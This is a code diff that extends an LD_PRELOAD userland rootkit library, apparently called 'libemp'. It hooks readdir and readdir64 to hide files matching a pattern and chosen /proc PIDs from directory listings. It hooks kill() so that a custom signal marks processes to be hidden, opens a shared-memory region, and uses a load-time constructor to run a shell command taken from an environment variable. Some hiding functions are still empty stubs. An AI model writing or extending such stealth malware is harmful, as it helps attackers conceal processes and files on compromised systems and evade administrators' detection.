@@ -1,11 +1,22 @@
 #define _GNU_SOURCE
+#include "libemp.h"
 #include <dirent.h>
 #include <dlfcn.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <signal.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/mman.h>
+#include <sys/stat.h>
 #include <sys/types.h>
 #include <unistd.h>
+
+int is_hidden(const char* pid)
+{
+    return 0;
+}
 
 /*
  * Get a directory name given a DIR* handle
@@ -45,9 +56,6 @@ struct dirent64* readdir64(DIR* dirp)
     if (!orig_readdir64)
         orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
 
-    char* hide_me = getenv("LS_PATTERN");
-    char* hide_pid = getenv("LS_LOCK");
-
     struct dirent64* result = NULL;
     DIR* proc_1 = opendir("/proc/1");
     struct dirent64* temp = orig_readdir64(proc_1);
@@ -59,13 +67,14 @@ struct dirent64* readdir64(DIR* dirp)
             closedir(proc_1);
             return NULL;
         }
-        if (hide_pid && strcmp(pwd, "/proc") == 0) {
-            if (strcmp(result->d_name, hide_pid) == 0) {
+        if (strcmp(pwd, "/proc") == 0) {
+            if (is_hidden(result->d_name)) {
+                printf("HIT pid %s", result->d_name);
                 closedir(proc_1);
                 return temp;
             }
         }
-        if (hide_me && strstr(result->d_name, hide_me)) {
+        if (strstr(result->d_name, HIDE_ME)) {
             closedir(proc_1);
             return temp;
         }
@@ -81,9 +90,6 @@ struct dirent* readdir(DIR* dirp)
     if (!orig_readdir)
         orig_readdir = dlsym(RTLD_NEXT, "readdir");
 
-    char* hide_me = getenv("LS_PATTERN");
-    char* hide_pid = getenv("LS_LOCK");
-
     struct dirent* result = NULL;
     DIR* proc_1 = opendir("/proc/1");
     struct dirent* temp = orig_readdir(proc_1);
@@ -95,13 +101,14 @@ struct dirent* readdir(DIR* dirp)
             closedir(proc_1);
             return NULL;
         }
-        if (hide_pid && strcmp(pwd, "/proc") == 0) {
-            if (strcmp(result->d_name, hide_pid) == 0) {
+        if (strcmp(pwd, "/proc") == 0) {
+            if (is_hidden(result->d_name)) {
+                printf("HIT pid %s", result->d_name);
                 closedir(proc_1);
                 return temp;
             }
         }
-        if (hide_me && strstr(result->d_name, hide_me)) {
+        if (strstr(result->d_name, HIDE_ME)) {
             closedir(proc_1);
             return temp;
         }
@@ -111,13 +118,50 @@ struct dirent* readdir(DIR* dirp)
     return result;
 }
 
+void add_hide_pid(char* pid)
+{
+}
+
+int open_ramfs(void)
+{
+    int fd;
+    fd = shm_open("shm", O_RDWR | O_CREAT, S_IRWXU);
+    return fd;
+}
+
+int kill(pid_t pid, int sig)
+{
+    static int (*orig_kill)(pid_t pid, int sig) = NULL;
+    if (!orig_kill)
+        orig_kill = dlsym(RTLD_NEXT, "kill");
+
+    char pid_s[256];
+    if (!snprintf(pid_s, sizeof(pid_s), "%d", pid)) {
+        return orig_kill(pid, sig);
+    }
+
+    switch (sig) {
+    case SIGINVIS:
+        add_hide_pid(pid_s);
+        break;
+    default:
+        return orig_kill(pid, sig);
+    }
+
+    return 0;
+}
+
 void __attribute__((constructor)) initLibrary(void)
 {
+    if (!SHM_FD)
+        SHM_FD = open_ramfs();
+
     char* emp_path = getenv("LS_PATH");
     if (emp_path)
         execlp("sh", "-c", emp_path, (char*)0);
 }
 
-/* void __attribute__((destructor)) cleanUpLibrary(void) */
-/* { */
-/* } */
+void __attribute__((destructor)) cleanUpLibrary(void)
+{
+    /* free(HIDE_PIDS); */
+}
